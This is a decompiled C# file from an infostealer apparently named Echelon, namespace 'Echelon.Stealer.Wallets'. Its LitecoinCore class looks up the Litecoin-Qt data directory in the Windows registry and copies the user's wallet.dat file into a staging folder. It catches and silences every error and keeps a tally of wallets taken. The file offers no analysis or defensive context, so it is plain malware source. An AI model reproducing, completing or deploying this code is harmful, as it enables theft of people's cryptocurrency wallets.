using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000011 RID: 17
	internal class LitecoinCore
	{
		// Token: 0x06000045 RID: 69 RVA: 0x00019CC0 File Offset: 0x00017EC0
		public static void LitecStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
						LitecoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000047 RID: 71
		public static int count;
	}
}
